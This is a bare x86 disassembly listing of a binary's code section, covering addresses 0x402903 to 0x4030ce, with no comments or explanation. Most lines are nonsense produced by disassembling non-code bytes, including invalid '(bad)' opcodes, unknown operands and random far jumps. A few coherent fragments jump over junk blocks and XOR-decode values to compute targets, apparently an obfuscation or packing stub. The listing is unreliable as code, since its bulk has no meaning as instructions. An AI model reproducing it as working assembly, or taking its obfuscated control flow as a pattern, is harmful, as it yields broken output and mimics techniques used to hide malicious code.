  402903:	jmp    0xde24:0x1ff6017c
  40290a:	imul   ebp,esp,0x1
  40290d:	shl    DWORD PTR [esi],0x54
  402910:	sub    ebp,DWORD PTR [edx+esi*1]
  402913:	mov    cl,0xb8
  402915:	sub    al,0xbc
  402917:	cmc    
  402918:	pop    es
  402919:	push   ebx
  40291a:	xchg   BYTE PTR ds:0x5975ac4b,bh
  402920:	dec    ebx
  402921:	or     esi,DWORD PTR [edi-0x2a]
  402924:	cs popfw 
  402927:	jge    0x4028c3
  402929:	adc    BYTE PTR [eax+edi*1-0x32a444c],ch
  402930:	xchg   dl,cl
  402932:	call   0x7aa1:0x7708abbf
  402939:	frstor [eax-0x1b]
  40293c:	adc    DWORD PTR [ebx+0x3cd2be4c],ecx
  402942:	pop    esi
  402943:	pop    esp
  402944:	pop    ebp
  402945:	jnp    0x40298c
  402947:	fwait
  402948:	rcr    BYTE PTR [eax+0xf],0xb4
  40294c:	xor    eax,0x34fd5ab5
  402951:	fdivr  QWORD PTR [ecx]
  402953:	adc    eax,0x8dd68dce
  402958:	push   edx
  402959:	iret   
  40295a:	aam    0x33
  40295c:	mov    ds:0x5fa44943,al
  402961:	sub    DWORD PTR [eax+0x8],0xcdf31d2a
  402968:	clc    
  402969:	pop    ecx
  40296a:	jmp    ebp
  40296c:	mov    ah,0xae
  40296e:	push   edi
  40296f:	jnp    0x402943
  402971:	mov    edi,DWORD PTR [ebx]
  402973:	xchg   BYTE PTR [ebx],bl
  402975:	pop    ss
  402976:	inc    edx
  402977:	sub    eax,0x3bbfcbd2
  40297c:	dec    edx
  40297d:	mov    eax,ds:0x4cbb5fe6
  402982:	jge    0x40294f
  402984:	stc    
  402985:	mov    esp,0x9199c0a
  40298a:	adc    al,0x7a
  40298c:	xor    eax,0x7a98e805
  402991:	adc    DWORD PTR [ecx+0x6ffc87a5],ebx
  402997:	dec    esp
  402998:	dec    edx
  402999:	push   edx
  40299a:	mov    ?,WORD PTR [ebx+0x47]
  40299d:	xchg   BYTE PTR [ecx-0x2f],al
  4029a0:	stos   DWORD PTR es:[edi],eax
  4029a1:	test   al,0x7d
  4029a3:	fidivr DWORD PTR [edi+0x6320fa75]
  4029a9:	mov    esi,0x9bbee0c5
  4029ae:	xchg   edx,eax
  4029af:	std    
  4029b0:	or     DWORD PTR cs:[edx],edx
  4029b3:	bound  ebx,QWORD PTR [edx+0x7717f605]
  4029b9:	dec    ecx
  4029ba:	addr16 mov al,0x89
  4029bd:	fcmovnu st,st(3)
  4029bf:	call   0x810f767a
  4029c4:	fs jmp 0x241eee08
  4029ca:	mov    ds:0x4ec6219c,eax
  4029cf:	cmp    eax,0x54b427d4
  4029d4:	(bad)  
  4029d5:	scas   al,BYTE PTR es:[edi]
  4029d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029d7:	inc    esi
  4029d8:	jae    0x402a2b
  4029da:	push   es
  4029db:	in     al,0x63
  4029dd:	into   
  4029de:	dec    esi
  4029df:	shl    DWORD PTR [edx+0x25],0x7c
  4029e3:	(bad)  
  4029e5:	mov    bl,0x84
  4029e7:	jb     0x402a4b
  4029e9:	lahf   
  4029ea:	ret    0xe859
  4029ed:	les    ebx,FWORD PTR [eax]
  4029ef:	dec    ebp
  4029f0:	aas    
  4029f1:	xlat   BYTE PTR ds:[ebx]
  4029f2:	(bad)  
  4029f3:	xor    bh,BYTE PTR [edx+0x2d]
  4029f6:	pop    ebp
  4029f7:	jmp    DWORD PTR [ebx]
  4029f9:	shr    DWORD PTR [eax-0x4e],1
  4029fc:	(bad)  
  4029fd:	fdivp  st(6),st
  4029ff:	xchg   edx,eax
  402a00:	retf   0x4b5e
  402a03:	mov    dl,0xe9
  402a05:	arpl   ax,bp
  402a07:	sbb    bh,dh
  402a09:	push   cs
  402a0a:	xor    eax,0x1901326b
  402a0f:	retf   
  402a10:	pop    edx
  402a11:	push   ecx
  402a12:	or     DWORD PTR [ebx-0x7af02bbb],0x3
  402a1c:	mov    eax,DWORD PTR [ebp-0x10]
  402a1f:	xor    eax,esi
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	shr    BYTE PTR [esp+ecx*8],cl
  402a37:	xchg   ebx,eax
  402a38:	stos   BYTE PTR es:[edi],al
  402a39:	or     eax,0x7ffa7e7e
  402a3e:	jle    0x402abe
  402a40:	xor    dl,BYTE PTR [edi]
  402a42:	sbb    DWORD PTR [edx+0x6a],0x2e
  402a46:	sbb    BYTE PTR ds:0x89016cb3,al
  402a4c:	push   ebx
  402a4d:	leave  
  402a4e:	xlat   BYTE PTR ds:[ebx]
  402a4f:	or     al,0xb3
  402a51:	sub    ah,BYTE PTR [esi]
  402a53:	fs mov eax,0x7360331b
  402a59:	xor    BYTE PTR [ebx+0x59a284fd],dh
  402a5f:	mov    cl,0x3a
  402a61:	stos   BYTE PTR es:[edi],al
  402a62:	(bad)  
  402a63:	push   ds
  402a64:	jge    0x402ac9
  402a66:	lea    esi,[eax]
  402a68:	out    0x59,al
  402a6a:	ds xchg esi,eax
  402a6c:	and    al,0x56
  402a6e:	std    
  402a6f:	and    esp,ebx
  402a71:	shl    DWORD PTR [edx],cl
  402a73:	mov    al,0xa9
  402a75:	mov    cl,0xe4
  402a77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a78:	call   0x45cbb102
  402a7d:	mov    eax,0xbcb31b90
  402a82:	test   DWORD PTR [edx-0x80],ebp
  402a85:	inc    esp
  402a86:	push   esp
  402a87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a88:	mov    esp,0x5e4e8c1e
  402a8d:	dec    ebp
  402a8e:	sub    ecx,DWORD PTR [edx+0x2]
  402a91:	in     eax,dx
  402a92:	iret   
  402a93:	cmp    ebp,DWORD PTR [eax-0x41]
  402a96:	jmp    0x7dab836c
  402a9b:	sbb    ebx,esi
  402a9d:	jmp    0x5f697d9a
  402aa2:	in     eax,0xda
  402aa4:	test   eax,0x3fdb508a
  402aa9:	adc    dl,BYTE PTR [ecx+0x1]
  402aac:	jnp    0x402ac6
  402aae:	mov    edx,DWORD PTR [eax-0x63]
  402ab1:	add    eax,0x260e5c15
  402ab6:	jmp    0x4cd16552
  402abb:	(bad)  
  402abc:	test   eax,0x5b38a76
  402ac1:	sbb    eax,0x872244db
  402ac6:	push   cs
  402ac7:	add    edi,ebp
  402ac9:	cwde   
  402aca:	call   0x2934:0xe5d2030
  402ad1:	sub    eax,0x81e1d7c3
  402ad6:	adc    eax,0xdef2dd09
  402adb:	inc    ebx
  402adc:	jl     0x402aac
  402ade:	lahf   
  402adf:	pop    edx
  402ae0:	retf   
  402ae1:	aam    0x6b
  402ae3:	(bad)  [esi+0x7b]
  402ae6:	iret   
  402ae7:	fcomp  QWORD PTR ds:0xd19c4370
  402aed:	or     DWORD PTR [edi],0xffffff81
  402af0:	mov    DWORD PTR [edx+0x68],ecx
  402af3:	call   0xbf07:0xb5cce96d
  402afa:	aaa    
  402afb:	call   0x42bdf35a
  402b00:	jb     0x402b74
  402b02:	xor    BYTE PTR [esi-0x3f8fb349],ch
  402b08:	xchg   edx,eax
  402b09:	fdivr  DWORD PTR [esi-0x27]
  402b0c:	dec    eax
  402b0d:	(bad)  
  402b0e:	jo     0x402a90
  402b10:	mov    ds:0x18cba00,al
  402b15:	push   es
  402b16:	push   ecx
  402b17:	shr    DWORD PTR [edx],1
  402b19:	retf   
  402b1a:	mul    BYTE PTR [esi-0x78d8531]
  402b20:	dec    eax
  402b21:	dec    edx
  402b22:	add    al,0xbb
  402b24:	xor    dl,dl
  402b26:	mov    edx,0xbec1b79
  402b2b:	add    al,0x6b
  402b2d:	push   ebx
  402b2e:	sbb    eax,0x7ccff3bf
  402b33:	out    0xfa,al
  402b35:	jbe    0x402add
  402b37:	sub    eax,0xa44de155
  402b3c:	push   ds
  402b3d:	in     al,dx
  402b3e:	mov    ?,WORD PTR [edi]
  402b40:	call   0x71ad:0x57527952
  402b47:	test   BYTE PTR [ebp+0x1156d6ab],dl
  402b4d:	sub    ebx,DWORD PTR [edx-0x7e]
  402b50:	pop    esp
  402b51:	sub    al,0xf4
  402b53:	js     0x402af0
  402b55:	add    dh,cl
  402b57:	push   eax
  402b58:	sahf   
  402b59:	mov    BYTE PTR [eax+0x6675485b],ah
  402b5f:	hlt    
  402b60:	repnz std 
  402b62:	mov    ebp,0x234e9e9f
  402b67:	sbb    BYTE PTR [ebx+0x28],dh
  402b6a:	cmp    ch,al
  402b6c:	not    BYTE PTR [edi]
  402b6e:	pop    ss
  402b6f:	loop   0x402ba1
  402b71:	jge    0x402b7f
  402b73:	and    eax,DWORD PTR [ebx]
  402b75:	mov    al,ds:0x6100bd84
  402b7a:	mov    ebp,0xe67008bb
  402b7f:	inc    edi
  402b80:	mov    esi,0xbad9b18
  402b85:	fiadd  DWORD PTR [ebp-0xa725d16]
  402b8b:	into   
  402b8c:	cmp    DWORD PTR [eax-0x6a170814],eax
  402b92:	xlat   BYTE PTR ds:[ebx]
  402b93:	iret   
  402b94:	cmp    eax,0x3b923623
  402b99:	mov    al,0x62
  402b9b:	(bad)  
  402b9c:	hlt    
  402b9d:	shl    BYTE PTR [edi],1
  402b9f:	rcl    DWORD PTR [edi+0x406367],1
  402ba5:	sub    BYTE PTR [edx+0x43],0xe1
  402ba9:	inc    edi
  402baa:	sahf   
  402bab:	popa   
  402bac:	adc    esi,esi
  402bae:	and    DWORD PTR [edx+0xa],edx
  402bb1:	sbb    DWORD PTR [esi+0x6],esp
  402bb4:	adc    dl,BYTE PTR [ecx-0x9]
  402bb7:	cs cmps DWORD PTR ss:[esi],DWORD PTR es:[edi]
  402bba:	xlat   BYTE PTR ds:[ebx]
  402bbb:	scas   eax,DWORD PTR es:[edi]
  402bbc:	add    al,0x21
  402bbe:	pop    ds
  402bbf:	xchg   BYTE PTR [eax+eiz*2-0x3f7acabc],bh
  402bc6:	je     0x402bf4
  402bcc:	lea    eax,[ebp-0x98]
  402bd2:	push   eax
  402bd3:	mov    eax,DWORD PTR [ebp-0x1c]
  402bd6:	xor    eax,esi
  402bd8:	add    eax,edi
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	sbb    eax,0x36d66f91
  402c16:	or     edi,DWORD PTR [esi+0x7e]
  402c19:	cli    
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402c46
  402c1e:	jg     0x402bf4
  402c20:	std    
  402c21:	and    BYTE PTR [edx-0x59],0x8b
  402c25:	add    BYTE PTR [esi],dh
  402c27:	sahf   
  402c28:	daa    
  402c29:	(bad)  
  402c2b:	mov    ecx,DWORD PTR [ebp-0x271a085e]
  402c31:	(bad)  [ebx+eiz*2]
  402c34:	outs   dx,BYTE PTR ds:[esi]
  402c35:	and    ah,bh
  402c37:	pop    edx
  402c38:	dec    esi
  402c39:	lahf   
  402c3a:	(bad)  
  402c3b:	push   es
  402c3c:	and    eax,0x73b582a9
  402c41:	fnstenv [ecx-0xcd9a395]
  402c47:	jno    0x402c51
  402c49:	and    al,0x6d
  402c4b:	and    DWORD PTR [ecx-0x43],ecx
  402c4e:	outs   dx,DWORD PTR ds:[esi]
  402c4f:	fndisi(8087 only) 
  402c51:	in     eax,0x67
  402c53:	retf   0xa191
  402c56:	in     eax,dx
  402c57:	xor    al,0x9d
  402c59:	gs pop edi
  402c5b:	addps  xmm0,XMMWORD PTR [ecx+esi*2+0x6489c4e3]
  402c63:	xchg   esi,eax
  402c64:	jns    0x402c60
  402c66:	aam    0xb5
  402c68:	sar    BYTE PTR [edi],cl
  402c6a:	in     eax,0x9
  402c6c:	push   edx
  402c6d:	adc    eax,0xb84d42c9
  402c72:	addr16 dec eax
  402c74:	test   ch,bh
  402c76:	xchg   edi,eax
  402c77:	shr    BYTE PTR [edi-0x65434490],cl
  402c7d:	mov    eax,0x98d02176
  402c82:	leave  
  402c83:	scas   eax,DWORD PTR es:[edi]
  402c84:	inc    esp
  402c85:	mov    BYTE PTR [esi+0x5ab701d8],bh
  402c8b:	dec    esi
  402c8c:	scas   al,BYTE PTR es:[edi]
  402c8d:	or     BYTE PTR [ecx+0x5f],bh
  402c90:	outs   dx,DWORD PTR ds:[esi]
  402c91:	enter  0x59a4,0x43
  402c95:	push   esi
  402c96:	mov    ebp,0x902f3216
  402c9b:	nop
  402c9c:	jg     0x402c45
  402c9e:	mov    al,0xfb
  402ca0:	sbb    BYTE PTR [ecx+ebx*4+0x52],bl
  402ca4:	ins    DWORD PTR es:[edi],dx
  402ca5:	add    ecx,DWORD PTR [eax*4-0x561ea985]
  402cac:	loope  0x402c5f
  402cae:	(bad)  
  402caf:	call   0xf7bf7f44
  402cb4:	ins    BYTE PTR es:[edi],dx
  402cb5:	fs sub al,0x28
  402cb8:	iret   
  402cb9:	cwde   
  402cba:	cmp    eax,0x5b13f83a
  402cbf:	bound  edx,QWORD PTR [edx]
  402cc1:	hlt    
  402cc2:	xchg   ebp,eax
  402cc3:	cmp    DWORD PTR [edi-0x73],esp
  402cc6:	das    
  402cc7:	adc    eax,0x403fbca2
  402ccc:	jp     0x402ce3
  402cce:	fldcw  WORD PTR [eax]
  402cd0:	dec    esp
  402cd1:	jge    0x402c5b
  402cd3:	ins    BYTE PTR es:[edi],dx
  402cd4:	mov    WORD PTR [edi+0x4a],?
  402cd7:	cdq    
  402cd8:	lea    edx,[ecx+esi*2-0x2f403b25]
  402cdf:	in     al,dx
  402ce0:	not    DWORD PTR [edi]
  402ce2:	mov    bh,0x19
  402ce4:	lods   al,BYTE PTR ds:[esi]
  402ce5:	int    0x30
  402ce7:	loop   0x402d67
  402ce9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cea:	sub    esp,DWORD PTR [edi-0x6ebebb85]
  402cf0:	jae    0x402d16
  402cf2:	scas   eax,DWORD PTR es:[edi]
  402cf3:	dec    esp
  402cf4:	mov    ch,0x92
  402cf6:	add    ch,bh
  402cf8:	sahf   
  402cf9:	push   0xffffffb6
  402cfb:	fldcw  WORD PTR ds:0xeeeed8dc
  402d01:	add    DWORD PTR [ebp-0x104a9176],esi
  402d07:	aaa    
  402d08:	lahf   
  402d09:	lods   al,BYTE PTR ds:[esi]
  402d0a:	inc    esp
  402d0b:	dec    edi
  402d0c:	push   edx
  402d0d:	aas    
  402d0e:	jae    0x402d5c
  402d10:	and    ecx,DWORD PTR [edx+edi*4]
  402d13:	dec    eax
  402d14:	xchg   ecx,eax
  402d15:	mov    DWORD PTR [esi+0x3a4caa5e],edx
  402d1b:	and    BYTE PTR [esi+0x4be286f],cl
  402d21:	pop    ss
  402d22:	addr16 push ebp
  402d24:	and    DWORD PTR [ebx+ebp*8-0x2a],0xffffff9c
  402d29:	xor    ebp,DWORD PTR ds:0xd6a6fc42
  402d2f:	cmp    BYTE PTR [edi],bl
  402d31:	jmp    0x68a223b5
  402d36:	dec    ecx
  402d37:	scas   al,BYTE PTR es:[edi]
  402d38:	adc    eax,0x19484a26
  402d3d:	jg     0x402d39
  402d3f:	jle    0x402d7e
  402d41:	push   ds
  402d42:	mov    DWORD PTR [ebx+0x44],esp
  402d45:	jle    0x402d67
  402d47:	mov    eax,0xe3bc4038
  402d4c:	inc    ebx
  402d4d:	retf   
  402d4e:	push   ss
  402d4f:	push   ebp
  402d50:	mov    bh,0x3e
  402d52:	repnz cmp eax,DWORD PTR [edx-0x34]
  402d56:	pop    es
  402d57:	dec    edx
  402d58:	push   edi
  402d59:	scas   al,BYTE PTR es:[edi]
  402d5a:	test   al,0x49
  402d5c:	bound  ebp,QWORD PTR [ecx-0x711473b2]
  402d62:	scas   al,BYTE PTR es:[edi]
  402d63:	mov    ?,WORD PTR [ecx]
  402d65:	or     al,0x4
  402d67:	loope  0x402d1a
  402d69:	rol    DWORD PTR [eax-0x2b],cl
  402d6c:	test   DWORD PTR [ebx-0x4f],ebp
  402d6f:	cmp    al,0x5f
  402d72:	sbb    al,BYTE PTR [edx+0x31]
  402d75:	pop    esp
  402d76:	sub    dh,cl
  402d78:	mov    ds:0x36d11fd1,al
  402d7d:	out    dx,eax
  402d7e:	mov    eax,0xc00452b5
  402d83:	cld    
  402d84:	lea    eax,[edx-0x7e]
  402d87:	mov    cl,0xdf
  402d89:	push   sp
  402d8b:	pop    ebx
  402d8c:	dec    eax
  402d8d:	mov    edx,0xc2b1557e
  402d92:	test   al,0xae
  402d94:	popa   
  402d95:	and    ch,BYTE PTR gs:[esi-0x1f]
  402d99:	ins    DWORD PTR es:[edi],dx
  402d9a:	pop    esi
  402d9b:	xchg   ecx,eax
  402d9c:	mov    eax,0x94d33074
  402da1:	sub    eax,DWORD PTR [ebp-0x4]
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [edx+ecx*2+0x35],1
  402de7:	lea    ebx,[ebx]
  402de9:	mov    dl,0x8
  402deb:	jle    0x402e6b
  402ded:	cli    
  402dee:	jg     0x402e6e
  402df0:	jle    0x402e62
  402df2:	adc    al,0x59
  402df4:	sbb    al,0x77
  402df6:	mov    dl,0x2b
  402df8:	cdq    
  402df9:	mov    eax,ds:0xc8d8c75e
  402dfe:	jl     0x402e2a
  402e00:	test   BYTE PTR [edi],0xd1
  402e03:	mov    ch,0xb4
  402e05:	sbb    al,0x72
  402e07:	mov    ecx,0x18baf632
  402e0c:	mov    ah,0xd6
  402e0e:	add    BYTE PTR [eax+0x21],bh
  402e11:	popa   
  402e12:	fldenv [esi+0x7a]
  402e15:	pop    ss
  402e16:	dec    ebx
  402e17:	bound  esp,QWORD PTR [edx]
  402e19:	push   eax
  402e1a:	lods   eax,DWORD PTR ds:[esi]
  402e1b:	xchg   esi,eax
  402e1c:	aas    
  402e1d:	push   edi
  402e1e:	xchg   DWORD PTR [ebp-0x42],edi
  402e21:	mov    dh,0x58
  402e23:	sub    eax,0x8303e93c
  402e28:	test   eax,0x71797e8c
  402e2d:	xchg   ebp,eax
  402e2e:	cmp    eax,edx
  402e30:	or     eax,0x4ce83f44
  402e35:	or     ecx,DWORD PTR [ecx+0x4ec80667]
  402e3b:	sbb    BYTE PTR [ebx+0x3a1ce8fb],dl
  402e41:	lods   al,BYTE PTR ds:[esi]
  402e42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e43:	psubusb mm7,QWORD PTR [ebx]
  402e46:	mov    esp,DWORD PTR [ebp-0x20]
  402e49:	and    eax,0xe9765a8d
  402e4e:	fcom   DWORD PTR [ecx+eax*4-0x42]
  402e52:	ret    
  402e53:	push   edi
  402e54:	mov    esp,0x6a7e7b7f
  402e59:	loope  0x402ec1
  402e5b:	fisubr WORD PTR [ebp+0x4f]
  402e5e:	sar    DWORD PTR [ecx-0x65],1
  402e61:	jns    0x402e30
  402e63:	js     0x402e00
  402e65:	dec    eax
  402e66:	loopne 0x402e57
  402e68:	pop    ds
  402e69:	jne    0x402e75
  402e6b:	sysexit 
  402e6d:	pop    esp
  402e6e:	stos   BYTE PTR es:[edi],al
  402e6f:	add    DWORD PTR [ecx],esp
  402e71:	jmp    0x533b:0x18e10b2f
  402e78:	mov    eax,ds:0x1b4bdb7f
  402e7d:	out    0x1e,eax
  402e7f:	in     eax,0x9c
  402e81:	iret   
  402e82:	inc    edi
  402e83:	xlat   BYTE PTR ds:[ebx]
  402e84:	sbb    ah,BYTE PTR [edx+0x593f508c]
  402e8a:	mov    ds:0xfdbedc6e,eax
  402e8f:	sbb    bl,BYTE PTR [edx-0x65efe701]
  402e95:	cmp    BYTE PTR ds:0x5b4e3785,bl
  402e9b:	mov    gs,WORD PTR [edi-0x4a]
  402e9e:	xor    dl,al
  402ea0:	paddd  mm5,QWORD PTR [edx+0x276bbff4]
  402ea7:	jcxz   0x402ed4
  402eaa:	mov    bh,0x24
  402eac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ead:	or     eax,0x98f72049
  402eb2:	add    eax,0x793b1e89
  402eb7:	cmp    BYTE PTR [eax],0x2c
  402eba:	inc    edx
  402ebb:	std    
  402ebc:	jl     0x402e95
  402ebe:	jnp    0x402eea
  402ec0:	sbb    dl,bh
  402ec2:	gs jnp 0x402f30
  402ec5:	push   cs
  402ec6:	mov    ch,0xe3
  402ec8:	or     al,0xd8
  402eca:	scas   al,BYTE PTR es:[edi]
  402ecb:	jecxz  0x402ede
  402ecd:	jo     0x402f35
  402ecf:	lock or eax,0x3f608c12
  402ed5:	mov    al,0xe4
  402ed7:	add    al,0x7f
  402ed9:	cmp    esp,DWORD PTR [eax]
  402edb:	push   0x38
  402edd:	seto   BYTE PTR [edi]
  402ee0:	dec    esp
  402ee1:	pop    ebx
  402ee2:	mov    ds:0x255310d6,eax
  402ee7:	mov    al,0xc3
  402ee9:	mov    bl,0x4c
  402eeb:	fwait
  402eec:	das    
  402eed:	cmp    eax,0x5c8cd446
  402ef2:	sub    esp,DWORD PTR [ecx+0x7924d178]
  402ef8:	cs test al,0x23
  402efb:	inc    ecx
  402efc:	jmp    0x4d633870
  402f01:	inc    ebx
  402f02:	and    eax,0x5af09c14
  402f07:	aam    0xa4
  402f09:	dec    edx
  402f0a:	fwait
  402f0b:	inc    eax
  402f0c:	int3   
  402f0d:	sub    DWORD PTR [ebx],ecx
  402f0f:	out    dx,eax
  402f10:	int    0xbe
  402f12:	arpl   WORD PTR [ecx-0x207f82f2],si
  402f18:	cmp    al,0xdf
  402f1a:	push   ss
  402f1b:	cmp    al,0x42
  402f1d:	pop    ds
  402f1e:	mov    DWORD PTR [edi],eax
  402f20:	mov    bl,0xea
  402f22:	mov    esp,ebx
  402f24:	sub    DWORD PTR [edx+ebp*2-0x3e],ebx
  402f28:	xchg   ebx,eax
  402f29:	jno    0x402f46
  402f2b:	or     edx,eax
  402f2d:	sbb    ebx,edi
  402f2f:	jb     0x402f3b
  402f31:	and    DWORD PTR gs:[ecx-0x63],0xc8851a37
  402f39:	loop   0x402f2a
  402f3b:	jae    0x402f28
  402f3d:	shr    DWORD PTR [edi+0x767dae7a],0x9c
  402f44:	mov    edi,DWORD PTR [ecx]
  402f46:	mov    edi,0xd2e3e8f8
  402f4b:	fadd   st(3),st
  402f4d:	cmp    eax,0xb9b5467d
  402f52:	ja     0x402f05
  402f54:	jo     0x402f5a
  402f56:	fmul   DWORD PTR [edi+0x70]
  402f59:	out    0x86,al
  402f5b:	push   0xffffff9a
  402f5d:	nop
  402f5e:	add    bl,bh
  402f60:	bound  esi,QWORD PTR [eax+edx*8]
  402f63:	and    DWORD PTR [esi-0x46af45bd],ebx
  402f69:	int3   
  402f6a:	adc    esi,DWORD PTR [ebx-0x6daccfa7]
  402f70:	sti    
  402f71:	and    eax,0x8d30d1d8
  402f76:	add    eax,0x413c0c
  402f7b:	push   DWORD PTR [eax]
  402f7d:	lea    eax,ds:0x4139b8
  402f83:	push   DWORD PTR [eax]
  402f85:	lea    eax,ds:0x413bec
  402f8b:	push   DWORD PTR [eax]
  402f8d:	lea    eax,ds:0x413d34
  402f93:	push   DWORD PTR [eax]
  402f95:	xchg   ebx,edx
  402f97:	inc    ebx
  402f98:	inc    ebx
  402f99:	push   ebx
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi-0x10195a49]
  402fae:	(bad)  
  402faf:	ds pushw ss
  402fb2:	jle    0x403032
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x402ff3
  402fb9:	jmp    FWORD PTR [ebp-0x39d26607]
  402fbf:	lds    ebp,FWORD PTR ds:0x18683483
  402fc5:	pop    eax
  402fc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fc7:	and    DWORD PTR [ebx+0x3e],esp
  402fca:	imul   ebx,DWORD PTR [eax+0x45],0x4a
  402fce:	outs   dx,DWORD PTR ds:[esi]
  402fcf:	mov    ah,0xa3
  402fd1:	inc    esi
  402fd2:	pushf  
  402fd3:	jbe    0x403054
  402fd5:	mov    edx,0x6a93df24
  402fda:	mov    ds:0x9fba9b88,al
  402fdf:	ss mov al,0x5f
  402fe2:	mov    WORD PTR [edx+0x67],es
  402fe5:	mov    ds:0x569329fc,eax
  402fea:	nop
  402feb:	or     esi,DWORD PTR [eax]
  402fed:	stc    
  402fee:	sub    eax,0xc20a81a1
  402ff3:	xchg   ecx,eax
  402ff4:	mov    bl,0xab
  402ff6:	jmp    FWORD PTR [ecx+0x65]
  402ff9:	pop    esp
  402ffa:	lahf   
  402ffb:	add    dh,bl
  402ffd:	sbb    eax,0x37eb279c
  403002:	fcmovu st,st(3)
  403004:	imul   edi,DWORD PTR [eax-0x563f9427],0xffffff9d
  40300b:	mov    edx,0x3398ad40
  403010:	mov    ?,WORD PTR [edi+0xa037a0d]
  403016:	push   ss
  403017:	dec    ebp
  403018:	mov    BYTE PTR [edi],ch
  40301a:	ret    
  40301b:	sub    bh,BYTE PTR [esi-0x276309c6]
  403021:	ret    
  403022:	xchg   edi,ebp
  403024:	cld    
  403025:	(bad)  
  403026:	dec    ebp
  403027:	pop    ss
  403028:	fwait
  403029:	push   ebx
  40302a:	test   DWORD PTR [esi+0x64],eax
  40302d:	lods   al,BYTE PTR ds:[esi]
  40302e:	inc    ecx
  40302f:	and    eax,0xf4996d98
  403034:	or     al,0xeb
  403036:	xchg   edx,eax
  403037:	push   esi
  403038:	leave  
  403039:	inc    edx
  40303a:	fst    QWORD PTR [esi]
  40303c:	pop    edx
  40303d:	nop
  40303e:	dec    edi
  40303f:	stos   DWORD PTR es:[edi],eax
  403040:	pushf  
  403041:	addr16 in eax,0xbe
  403044:	fs sbb eax,0x631daff5
  40304a:	jg     0x403077
  40304c:	fstp   QWORD PTR [esi+0x41]
  40304f:	(bad)  
  403050:	retf   
  403051:	add    bh,ah
  403053:	aas    
  403054:	fistp  DWORD PTR [eax+ebp*8]
  403057:	dec    esp
  403058:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403059:	sbb    esp,esp
  40305b:	lock das 
  40305d:	(bad)  
  40305e:	mov    ds:0xb09066b7,al
  403063:	test   eax,0x5f3f4083
  403068:	addr16 mov bh,0x33
  40306b:	scas   al,BYTE PTR es:[edi]
  40306c:	dec    edi
  40306d:	push   esi
  40306e:	(bad)  
  40306f:	repz sub DWORD PTR [bx+di],eax
  403073:	out    dx,al
  403074:	fwait
  403075:	mov    es,ebp
  403077:	push   cs
  403078:	(bad)  
  403079:	jns    0x403084
  40307b:	push   ebx
  40307c:	push   ds
  40307d:	sti    
  40307e:	mov    ds:0xed313fd2,eax
  403083:	or     DWORD PTR [esi],ebx
  403085:	stc    
  403086:	push   ebx
  403087:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403088:	scas   al,BYTE PTR es:[edi]
  403089:	xor    eax,0xda429293
  40308e:	xor    DWORD PTR [ebp-0x5371517c],ebp
  403094:	mov    al,0x18
  403096:	stos   DWORD PTR es:[edi],eax
  403097:	push   eax
  403098:	out    0xcc,eax
  40309a:	adc    DWORD PTR [edx-0x105a1e82],esi
  4030a0:	adc    al,0xc0
  4030a2:	sbb    DWORD PTR [edi+0x63],ecx
  4030a5:	imul   esp,DWORD PTR [edi-0x2312a8c8],0x103d2d4
  4030af:	jmp    0xf01fa7a0
  4030b4:	fwait
  4030b5:	mov    edx,0xa236fe2f
  4030ba:	sbb    cl,BYTE PTR [ecx+ecx*8+0x3d]
  4030be:	push   eax
  4030bf:	out    dx,eax
  4030c0:	test   BYTE PTR [eax-0x16],ah
  4030c3:	pop    eax
  4030c4:	push   esp
  4030c5:	push   ebp
  4030c6:	inc    eax
  4030c7:	jo     0x4030a4
  4030c9:	sbb    eax,0x68739da3
  4030ce:	add    DWORD PTR [ebp-0x7],ebp
